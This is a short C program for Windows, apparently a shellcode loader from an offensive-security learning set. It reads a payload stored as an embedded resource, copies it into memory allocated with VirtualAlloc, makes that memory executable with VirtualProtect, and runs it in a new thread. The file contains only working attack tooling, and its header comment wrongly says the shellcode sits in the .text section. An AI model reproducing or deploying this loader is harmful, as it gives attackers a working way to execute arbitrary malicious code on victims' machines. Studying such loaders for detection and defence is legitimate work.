// embed shellcode in .text section
// created by : bluecosmo

// imports
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define SC_ICON 2583

// main code
int main(VOID) {

    // find shellcode payload
    HRSRC shellcode = FindResourceW(NULL, MAKEINTRESOURCEW(SC_ICON), RT_RCDATA
        // [in, optional] HMODULE hModule,
        // [in]           LPCSTR  lpName,
        // [in]           LPCSTR  lpType
    );

    // load shellcode payload
    HGLOBAL shellcode_handle = LoadResource(NULL, shellcode
            // [in, optional] HMODULE hModule,
            // [in]           HRSRC   hResInfo
    );
    
    // get pointer to shellcode payload
    LPVOID shellcode_payload = LockResource(shellcode_handle
        // [in] HGLOBAL hResData
    );

    // get lenght of shellcode payload
    DWORD shellcode_length = SizeofResource(NULL, shellcode
        // [in, optional] HMODULE hModule,
        // [in]           HRSRC   hResInfo
    );
        
    // allocate the memory
    LPVOID memory_address = VirtualAlloc(NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        // [in, optional] LPVOID lpAddress,
        // [in]           SIZE_T dwSize,
        // [in]           DWORD  flAllocationType,
        // [in]           DWORD  flProtect
    );

    // load shellcode into memory
    RtlMoveMemory(memory_address, shellcode_payload, shellcode_length
        // _Out_       VOID UNALIGNED *Destination,
        // _In_  const VOID UNALIGNED *Source,
        // _In_        SIZE_T         Length
    );

    // make shellcode executable
    DWORD old_protection = 0;
    BOOL returned_vp = VirtualProtect(memory_address, shellcode_length, PAGE_EXECUTE_READ, & old_protection
        // [in]  LPVOID lpAddress,
        // [in]  SIZE_T dwSize,
        // [in]  DWORD  flNewProtect,
        // [out] PDWORD lpflOldProtect
    );

    // execute thread
    if (returned_vp != NULL) {
        HANDLE thread_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) memory_address, NULL, NULL, NULL
            // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
            // [in]            SIZE_T                  dwStackSize,
            // [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
            // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
            // [in]            DWORD                   dwCreationFlags,
            // [out, optional] LPDWORD                 lpThreadId
        );

        // waite for thread to complete
        WaitForSingleObject(thread_handle, INFINITE
            // [in] HANDLE hHandle,
            // [in] DWORD  dwMilliseconds
        );
    }
}

